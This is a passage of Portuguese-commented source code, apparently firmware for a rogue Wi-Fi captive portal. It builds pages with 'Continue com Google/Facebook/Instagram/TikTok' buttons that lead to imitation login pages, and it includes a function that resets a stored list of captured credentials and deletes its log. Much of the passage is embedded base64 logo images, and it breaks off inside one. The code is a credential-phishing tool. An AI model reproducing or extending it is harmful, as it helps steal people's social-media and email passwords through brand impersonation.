zLgqIo8Hg8MAwDiqJsuAslORAKhX5YSdnc3Fzuiy++eNHtduftHn2tZ0zTBEVR2LZtW/Ege1wUCgUcP34cgUBgwyaxZAe2b9/+tUqLDQ0N/XZ5eXlSURTIsryubbYsC263G263u+Y7QbkdsKFpGtrb2+F0OvHxxx9DkqSSuSV0IpEIX05RPp/H9PT05aWlJSwuLiKTyRSfHGmaBk3TMAwDoVBo3c6gSg6sJfHo72FHgEgkglOnToFhGGSz2aJsyQ5Uahfm5+cNv9+fWdvEGYYBWZaRTCaLfY/f74eqqo9e8E0AGx4qtpHVwi2bzaK5uRknT57EhQsXNiZQCZqmKT6fTw8EAsVXYsMwIIoixsbGQJIkvF4v/H5/8YXioRcpy7LKPa3DNE3oul7TBSidTsPv9+OFF17YmICmaWCYjXX5/f6GbDbrTqfTxQ8NXq+32LsAgNPpRDqdRjabBcMw0DQNPM8LTU1NZY0SRdHM5XKo9HXmUdA0XSzRJVKJRMKIRqMbCoXDYWia1vXll18Oud1uKIqCWCyGJ554ojiH53mMj48jmUyC53mIooj29vYDPp+vrDFLS0u5ZDJpcNy6jzcVYdtZQuDevXv3otGov5xQT0/PG/Pz8x8wDFNoaWkBwzDFZ0Y7pOyzIZlMwuFweLu7u1+tZMji4uLo3bt385XuGRvhyJEj6wnMzc395emnny5bSnt6enZPTU2dj8fjPw2HwxvGrZ2UmUwGfX19v+7s7NxehcDA3NwcXC7XpgjYeJTAzaWlJQSDwbICp0+ffs2yLHJhYeH1hoYGYy0JgiCQy+UgyzLb19f3znPPPVfxYJyZmdFmZ2fHSJJc9/FuSwTy+fytiYmJD4PB4JlyAhRF4ezZs68ODw9/4/79++ez2ey/RFEUCYIgstmsMxgM7otGo7/Yu3dvWzXl4+Pjf87lcv+rlCObIiAIAkZGRv7U0dFxurGxseJloLe3d2d3d/f79+7dQ2NjYxIA4Xa7G1taWshaKkoikViNx+N/dLvdWzZ+HQGCIJBOp69ev379neeff/4nVYVpGq2trQAQ2qzia9eu/UaW5f8KgvBYr9klWSjLMmiaxtDQ0Os3b968tuVVq+Dzzz+/ODk5+fbaTnazPxslO2AP0DStf/rpp99yOByDe/fufaqexl+/fv3WlStXXrRvbY/7ir3h+c1xHCiKWr148eKRGzduDD6WhocwTROXL1/+8JNPPjnGMIy02YOrHDbMNsuywPM8JElanZycPJ5Op3++Z8+eN7Zv3y5stse3LAvT09Orw8PDbyWTyd/bnq/XN7Wy5cKyLDAMA5/PZ0xNTf1ycnLyQk9Pz2vhcPjbO3bsEKq9WGiahrt3767Mz8//dXh4+Hc0TU9u27YNqVSqrv+2ULXePXypgMPhGLt169YP2trazmcymb0zMzNn29ra+nw+n9Pr9TKWZUEURWN5eTkzNTX1j+bm5ouzs7ND09PT842NjTVdL7eC/wPm3uiyG9NykwAAAABJRU5ErkJggg==";
  */
  
  return header("<center>" + String(TITLE) + "</center>") +
         "<div><center>" + BODY + "</center></div>" +
         "<div style=\"text-align: center;\">" +
         String("<div><button style=\"background-color: #B40404; color: white; width: 200px; height: 40px;\" onclick=\"location.href='/google';\"><span style='text-align: center; justify-content: center;'><img src='") + googleIconBase64 + String("' style='height: 20px; margin-right: 8px;'>Continue com Google</span></button></div>") +
         String("<div><button style=\"background-color: #2E64FE; color: white; width: 200px; height: 40px;\" onclick=\"location.href='/facebook';\"><span style='text-align: center; justify-content: center;'><img src='") + facebookIconBase64 + String("' style='height: 20px; margin-right: 8px;'>Continue com Facebook</span></button></div>") +
         String("<div><button style=\"background-color: #DF01D7; color: white; width: 200px; height: 40px;\" onclick=\"location.href='/instagram';\"><span style='text-align: center; justify-content: center;'><img src='") + instagramIconBase64 + String("' style='height: 20px; margin-right: 8px;'>Continue com Instagram</span></button></div>") +
         String("<div><button style=\"background-color: #1C1C1C; color: white; width: 200px; height: 40px;\" onclick=\"location.href='/tiktok';\"><span style='text-align: center; justify-content: center;'><img src='") + tiktokIconBase64 + String("' style='height: 20px; margin-right: 8px;'>Continue com TikTok</span></button></div>") +
         "</div>" +
         footer();
}


String redirectPage = "/web_page"; // Defina a página para a qual deseja redirecionar após 15 segundos

String web_page() {
  // titulo para a pagina 
  String titlePageBase64 = "";
  // imagem da pagina em base64 para carregamento sem internet - problema, a imagem não pode ser muito grande, senão não carrega.
  String pageBase64 = "";

  return "<!DOCTYPE html><html>"
         "<meta charset=\"UTF-8\">"
         "<head><title>" + String(titlePageBase64) + "</title>"
         "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
         "</head>"
         "<body>"
         "<img src=\"" + String(pageBase64) + "\">"
         "</body>"
         "</html>";
}

String clear() {
  clearLog(); // Chama a função para remover o arquivo de log
  return header("<center>" + String(CLEAR_TITLE) + "</center>") + "<center><p>A lista de credenciais foi redefinida e o arquivo de log foi removido.</p></<center><center><a style=\"color:blue\" href=/>Voltar a Home</a></center>" + footer();
}

  String loginPage(String socialMedia) {
  selectedSocialMedia = socialMedia;

  String googleBase64 = "";
  String facebookBase64 = "";
  String instagramBase64 = "";
  String tiktokBase64 = "";

  /*
  String googleBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAAAqCAYAAAB7uVNDAAAACXBIWXMAAAdiAAAHYgE4epnbAAAE7mlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgOS4xLWMwMDEgNzkuMTQ2Mjg5OSwgMjAyMy8wNi8yNS0yMDowMTo1NSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDI0LjcgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMy0xMi0xN1QyMDoxNzowMS0wMzowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjMtMTItMThUMDg6NTk6MzctMDM6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjMtMTItMThUMDg6NTk6MzctMDM6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjllYjc5NTdhLWM4NjAtMjk0Mi05YzM1LTgwNDA3MTZhZWZiYyIgeG1wTU06RG9jdW1lbnRJRD0i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";
  String facebookBase64 = "data:image/png;base64,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";
  String instagramBase64 = "data:image/png;base64,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